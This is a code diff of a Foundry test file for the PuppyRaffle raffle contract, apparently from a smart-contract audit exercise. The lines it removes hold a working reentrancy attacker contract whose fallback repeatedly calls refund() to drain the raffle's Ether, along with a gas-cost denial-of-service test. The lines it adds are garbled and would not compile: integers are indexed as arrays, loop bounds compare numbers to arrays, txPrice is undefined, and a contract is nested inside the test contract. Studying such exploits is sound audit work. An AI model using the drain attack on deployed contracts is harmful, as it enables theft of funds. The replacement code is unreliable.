@@ -251,86 +251,76 @@ function testTotalFeesOverflow() public playersEntered {
     }
 
 
-
     /////////////////////////////////////
     /// Test Denial of Service       ///
     ////////////////////////////////////
-    function test_DoS() public {
+    function testEnterRaffleIsGasInefficient() public {
+        vm.startPrank(owner);
         vm.txGasPrice(1);
-        // Let's try to enter 100 players;
-        // this is how we create 100 players with different addresses
-        uint256 playersNum = 100;
-        address[] memory players = new address[](playersNum);
-        for (uint256 i = 0; i < playersNum; i++) {
-            players[i] = address(i);
+ 
+        /// First we enter 100 participants
+        uint256 firstBatch = 100;
+        address[] memory firstBatchPlayers = new address[](firstBatch);
+        for(uint256 i = 0; i < firstBatchPlayers; i++) {
+        firstBatch[i] = address(i);
         }
-        // see how much gas it costs
+
         uint256 gasStart = gasleft();
-        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
+        puppyRaffle.enterRaffle{value: entranceFee * firstBatch}(firstBatchPlayers);
         uint256 gasEnd = gasleft();
+        uint256 gasUsedForFirstBatch = (gasStart - gasEnd) * txPrice;
+        console.log("Gas cost of the first 100 partipants is:", gasUsedForFirstBatch);
 
-        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
-        console.log("Gas used for 100 players: ", gasUsedFirst);
-
-
-         // now for the 2nd 100 players;
-        address[] memory playersTwo = new address[](playersNum);
-        for (uint256 i = 0; i < playersNum; i++) {
-            playersTwo[i] = address(i + playersNum); // 0, 1, 2 => 100, 101, 102
+        /// Now we enter 100 more participants
+        uint256 secondBatch = 200;
+        address[] memory secondBatchPlayers = new address[](secondBatch);
+        for(uint256 i = 100; i < secondBatchPlayers; i++) {
+        secondBatch[i] = address(i);
         }
-        // see how much gas it costs
-        uint256 gasStartSecond = gasleft();
-        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
-        uint256 gasEndSecond = gasleft();
-
-        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
-        console.log("Gas used for the second 100 players: ", gasUsedSecond);
-
-        assert(gasUsedFirst < gasUsedSecond);
-        }
+  
+        gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * secondBatch}(secondBatchPlayers);
+        gasEnd = gasleft();
+        uint256 gasUsedForSecondBatch = (gasStart - gasEnd) * txPrice;
+        console.log("Gas cost of the next 100 participant is:", gasUsedForSecondBatch);
+        vm.stopPrank(owner);
+}
 
      ///////////////////////////////////
      /// Test Reentrancy            ///
     //////////////////////////////////
-    function testReentrance() public playersEntered {
-        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle)); // deploy attacker contract
-        vm.deal(address(attacker), 1e18); // The attacker contract is given 1 Ether for entrance fee 
-        uint256 startingAttackerBalance = address(attacker).balance; // The initial balances of the attacker and the PuppyRaffle contract are stored for comparison after the attack.
-        uint256 startingContractBalance = address(puppyRaffle).balance;
+    
+contract AttackContract {
+    PuppyRaffle public puppyRaffle;
+    uint256 public receivedEther;
 
-        attacker.attack(); // The attack() function is executed, which triggers the following sequence:
-                           // Enter the raffle by calling puppyRaffle.enterRaffle.
-                           // Call the refund() function, initiating the reentrancy attack.
-
-        uint256 endingAttackerBalance = address(attacker).balance; 
-        uint256 endingContractBalance = address(puppyRaffle).balance;
-        assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
-        assertEq(endingContractBalance, 0);
-}
-}
-
-contract ReentrancyAttacker {
-    PuppyRaffle puppyRaffle;
-    uint256 entranceFee;
-    uint256 attackerIndex;
-
-    constructor(address _puppyRaffle) {
-        puppyRaffle = PuppyRaffle(_puppyRaffle);
-        entranceFee = puppyRaffle.entranceFee();
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
     }
 
-    function attack() external payable {
-        address[] memory players = new address[](1); // initialize a dynamic array with a fixed size of 1
-        players[0] = address(this); // Since this array has only 1 element, players[0] is the only available index
-        puppyRaffle.enterRaffle{value: entranceFee}(players); // The attacker enters the raffle using their contract address as the player.
-        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this)); //The index of the attacker in the players array is retrieved.
-        puppyRaffle.refund(attackerIndex); // The attacker then calls refund() to start the reentrancy attack.
+    function attack() public payable {
+        require(msg.value > 0);
+
+        // Create a dynamic array and push the sender's address
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+
+        puppyRaffle.enterRaffle{value: msg.value}(players);
     }
 
-    // When Ether is sent, the attacker’s fallback() function is triggered.
     fallback() external payable {
-        if (address(puppyRaffle).balance >= entranceFee) {  // checks if the PuppyRaffle contract still has enough Ether to refund again.
-            puppyRaffle.refund(attackerIndex); // If so, it calls refund() again, repeating the process until the contract's balance is drained.
+        if (address(puppyRaffle).balance >= msg.value) {
+            receivedEther += msg.value;
+
+            // Find the index of the sender's address
+            uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+
+            if (playerIndex > 0) {
+                // Refund the sender if they are in the raffle
+                puppyRaffle.refund(playerIndex);
+            }
         }
     }
+}
+
 }
